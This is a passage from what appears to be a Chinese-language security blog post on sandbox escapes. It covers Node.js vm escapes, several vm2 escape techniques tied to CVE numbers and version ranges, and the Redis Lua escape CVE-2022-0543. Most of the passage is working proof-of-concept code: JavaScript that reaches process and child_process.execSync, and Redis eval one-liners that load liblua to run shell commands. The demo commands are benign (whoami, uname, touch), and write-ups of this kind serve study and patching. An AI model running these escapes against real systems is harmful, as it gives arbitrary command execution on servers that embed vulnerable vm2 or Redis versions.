<p>这里我们写了一个函数，同时重写了tostring方法，输出的时候，通过arguments.callee.caller获得正在运行的函数，然后获得构造器，成功构造全局变量，rce成功</p>
<h4 id="Proxy劫持属性"><a href="#Proxy劫持属性" class="headerlink" title="Proxy劫持属性"></a>Proxy劫持属性</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure>

<p>我们定义了一个get函数，取用类里面对象的时候就会执行</p>
<h4 id="proxy报错回显"><a href="#proxy报错回显" class="headerlink" title="proxy报错回显"></a>proxy报错回显</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里直接调用了null，会报错，但是会在报错的时候，用catch捕获到了throw出的proxy对象，将相关的报错和rce结构都返回了。</p>
<h2 id="3-vm2逃逸"><a href="#3-vm2逃逸" class="headerlink" title="3.vm2逃逸"></a>3.vm2逃逸</h2><blockquote>
<p>我又来啦 嗨嗨嗨</p>
</blockquote>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>vm实在是太差了，所以第三方包vm2来了</p>
<p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p>
<p>这里主要还是一些cve之类的</p>
<h3 id="通过超过RangeError的最大调用堆栈大小CVE-2019-10761"><a href="#通过超过RangeError的最大调用堆栈大小CVE-2019-10761" class="headerlink" title="通过超过RangeError的最大调用堆栈大小CVE-2019-10761"></a>通过超过RangeError的最大调用堆栈大小CVE-2019-10761</h3><p>要求version &lt;3.6.11</p>
<p>在沙箱外的对象中触发一个异常，并在沙箱内捕捉错误e，这样就可以获得一个外部异常e，再利用这个异常e的constructor获得Function从而获取process对象执行代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="title class_">Buffer</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">write</span>;</span><br><span class="line"><span class="keyword">const</span> ft = &#123;</span><br><span class="line">    <span class="attr">length</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="title function_">utf8Write</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		x = <span class="title function_">r</span>(i);</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_">typeof</span>(x)!==<span class="string">&#x27;number&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">if</span>(x!==i)</span><br><span class="line">		<span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		f.<span class="title function_">call</span>(ft);</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		i=<span class="title function_">r</span>(i).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">i.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h3><p>version&lt;3.9.5</p>
<h3 id="import逃逸"><a href="#import逃逸" class="headerlink" title="import逃逸"></a>import逃逸</h3><p>import()在JavaScript中是一个语法结构，不是函数,所以我们能可以通过这样的方法直接调用构造器获得一个外部的变量</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>

<h3 id="has方法未代理导致绕过"><a href="#has方法未代理导致绕过" class="headerlink" title="has方法未代理导致绕过"></a>has方法未代理导致绕过</h3><p>首先在沙箱中自己定义了Object.prototype.has方法，在该方法里面通过获取t变量（也就是主键）的构造器，然后再返回process对象</p>
<p>第二个部分就是，通过 “” in Buffer.from 来触发has方法来实现返回process对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">    process = t.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot; in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取host-Function逃逸执行rce"><a href="#获取host-Function逃逸执行rce" class="headerlink" title="获取host.Function逃逸执行rce"></a>获取host.Function逃逸执行rce</h3><p>poc</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(a, <span class="string">&quot;&quot;</span>, &#123;</span><br><span class="line">        <span class="keyword">get</span> <span class="title function_">set</span>() &#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&quot;get&quot;</span>, &#123;</span><br><span class="line">                <span class="attr">get</span>: <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> x.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="function">()=&gt;</span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    process = <span class="title function_">e</span>(<span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="劫持通过劫持Symbol对象的getter"><a href="#劫持通过劫持Symbol对象的getter" class="headerlink" title="劫持通过劫持Symbol对象的getter"></a>劫持通过劫持Symbol对象的getter</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Symbol</span> = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">toStringTag</span>()&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line">&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">  <span class="title class_">Symbol</span> = &#123;&#125;;</span><br><span class="line">  <span class="title function_">f</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="覆盖prepareStackTrace"><a href="#覆盖prepareStackTrace" class="headerlink" title="覆盖prepareStackTrace"></a>覆盖prepareStackTrace</h3><p>version&lt;3.9.10</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; set &#125; = <span class="title class_">WeakMap</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line"><span class="title class_">WeakMap</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">set</span> = <span class="keyword">function</span>(<span class="params">v</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> set.<span class="title function_">call</span>(<span class="variable language_">this</span>, v, v);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> =</span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> =</span><br><span class="line"><span class="function">(<span class="params">_, c</span>) =&gt;</span> c.<span class="title function_">map</span>(<span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">getThis</span>()).<span class="title function_">find</span>(<span class="function"><span class="params">a</span> =&gt;</span> a);</span><br><span class="line"><span class="keyword">const</span> &#123; stack &#125; = <span class="keyword">new</span> <span class="title class_">Error</span>();</span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> = <span class="literal">undefined</span>;</span><br><span class="line">stack.<span class="property">process</span></span><br></pre></td></tr></table></figure>

<h3 id="CVE-2022-36067"><a href="#CVE-2022-36067" class="headerlink" title="CVE-2022-36067"></a>CVE-2022-36067</h3><p>vsrsion&lt;3.9.11</p>
<p>3.9.10中并没有对Error做相关的限制，导致我们可以重新定义一个Error来绕过对LocalError的prepareStackTrace的操作，就是我们通过实例化Error对象就可以获得栈的情况，其中prepareStackTrace函数定义了如何对异常的栈的处理，我们这边进行重写，因为栈中不仅包含了沙箱的栈还包含了其他作用域下的栈，那么思路就出来了，我们只需要通过遍历栈中的对象，拿到全局作用域下的process即可进行逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">globalThis.OldError=globalThis.Error;</span><br><span class="line">globalThis.Error=&#123;&#125;</span><br><span class="line">globalThis.Error.prepareStackTrace=(errStr,traces)=&gt;&#123;</span><br><span class="line">    traces[0].getThis().process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">const &#123;stack&#125;=new globalThis.OldError</span><br></pre></td></tr></table></figure>

<h2 id="4-redis逃逸"><a href="#4-redis逃逸" class="headerlink" title="4.redis逃逸"></a>4.redis逃逸</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p><a target="_blank" rel="noopener" href="https://redis.io/">Redis</a>是一种非常广泛使用的缓存服务，但它也被用作消息代理。客户端通过套接字与 Redis 服务器通信，发送命令，服务器更改其状态（即其内存结构）以响应此类命令。Redis 嵌入了 Lua 编程语言作为其脚本引擎，可通过<strong>eval</strong>命令使用。Lua 引擎<a target="_blank" rel="noopener" href="http://antirez.com/news/119">应该是沙盒</a>化的，即客户端可以与 Lua 中的 Redis API 交互，但不能在运行 Redis 的机器上执行任意代码。</p>
<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，<strong>module</strong>和<strong>require</strong>以及<strong>package</strong>的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而<strong>package</strong>并没有清楚，所以导致redis可以加载上游的Lua全局变量<strong>package</strong>来逃逸沙箱。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void luaLoadLibraries(lua_State *lua) &#123;                                                                 </span><br><span class="line">luaLoadLib(lua, <span class="string">&quot;&quot;</span>, luaopen_base);                                                        </span><br><span class="line">luaLoadLib(lua, LUA_TABLIBNAME, luaopen_table);                                                          </span><br><span class="line">luaLoadLib(lua, LUA_STRLIBNAME, luaopen_string);                                                           </span><br><span class="line">luaLoadLib(lua, LUA_MATHLIBNAME, luaopen_math);                                                               </span><br><span class="line">luaLoadLib(lua, LUA_DBLIBNAME, luaopen_debug);</span><br><span class="line">luaLoadLib(lua, <span class="string">&quot;cjson&quot;</span>, luaopen_cjson); </span><br><span class="line">luaLoadLib(lua, <span class="string">&quot;struct&quot;</span>, luaopen_struct);                                                                   </span><br><span class="line">luaLoadLib(lua, <span class="string">&quot;cmsgpack&quot;</span>, luaopen_cmsgpack);                                                                  </span><br><span class="line">luaLoadLib(lua, <span class="string">&quot;bit&quot;</span>, luaopen_bit);                                                            </span><br><span class="line">#<span class="keyword">if</span> <span class="number">0</span> /* Stuff that we don<span class="string">&#x27;t load currently, for sandboxing concerns. */</span></span><br><span class="line"><span class="string">luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);                                                          </span></span><br><span class="line"><span class="string">luaLoadLib(lua, LUA_OSLIBNAME, luaopen_os);                                                         </span></span><br><span class="line"><span class="string">#endif </span></span><br><span class="line"><span class="string">debian/lua_libs_debian.c:</span></span><br><span class="line"><span class="string">echo &quot;// Automatically generated; do not edit.&quot; &gt;$@</span></span><br><span class="line"><span class="string">echo &quot;luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);&quot; &gt;&gt;$@</span></span><br><span class="line"><span class="string">set -e; for X in $(LUA_LIBS_DEBIAN_NAMES); do \</span></span><br><span class="line"><span class="string">      echo &quot;if (luaL_dostring(lua, \&quot;$$X = require(&#x27;</span>$$X<span class="string">&#x27;);\&quot;))&quot; &gt;&gt;$@; \</span></span><br><span class="line"><span class="string">      echo &quot;   serverLog(LL_NOTICE, \&quot;Error loading $$X library\&quot;);&quot; &gt;&gt;$@; \</span></span><br><span class="line"><span class="string">done</span></span><br><span class="line"><span class="string">echo &#x27;</span>luaL_dostring(lua, <span class="string">&quot;module = nil; require = nil;&quot;</span>);<span class="string">&#x27; &gt;&gt;$@</span></span><br></pre></td></tr></table></figure>

<p>最后没有设置pakeage为null</p>
<h3 id="CVE-2022-0543-poc"><a href="#CVE-2022-0543-poc" class="headerlink" title="CVE-2022-0543   poc"></a>CVE-2022-0543   poc</h3><p>攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。</p>
<p>存在在以下版本</p>
<ul>
<li><p>2.2 &lt;&#x3D; redis &lt; 5.0.13</p>
</li>
<li><p>2.2 &lt;&#x3D; redis &lt; 6.0.15</p>
</li>
<li><p>2.2 &lt;&#x3D; redis &lt; 6.2.5</p>
<p>poc</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;uname -a&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>



<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval <span class="string">&#x27;local os_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_os&quot;); local os = os_l(); os.execute(&quot;touch /tmp/redis_eval&quot;); return 0&#x27;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="刷题记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">刷题记录</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/04/2023%20%E7%BE%8A%E5%9F%8E%E6%9D%AF/" title="2023 羊城杯-web wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">2023 羊城杯-web wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.1.</span> <span class="toc-text">1.python沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86import"><span class="toc-number">1.1.2.</span> <span class="toc-text">过滤了import</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86os"><span class="toc-number">1.1.3.</span> <span class="toc-text">过滤了os</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0-builtins"><span class="toc-number">1.1.4.</span> <span class="toc-text">利用内建函数__builtins__</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87dict%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">通过dict访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E5%90%84%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">调用各种函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#import%E5%AF%BC%E5%85%A5%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">import导入其他模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#object%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.5.</span> <span class="toc-text">object方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattribute%E3%80%81decode%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.6.</span> <span class="toc-text">getattribute、decode拼接绕过关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request%E6%B3%95"><span class="toc-number">1.1.7.</span> <span class="toc-text">request法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%BC%95%E5%8F%B7"><span class="toc-number">1.1.8.</span> <span class="toc-text">无引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0"><span class="toc-number">1.1.9.</span> <span class="toc-text">无__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.10.</span> <span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#curl"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.11.</span> <span class="toc-text">其他模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.1.12.</span> <span class="toc-text">unicode字符绕过字符替换</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.2.</span> <span class="toc-text">2.vm沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">0.介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-js%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.js的作用域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 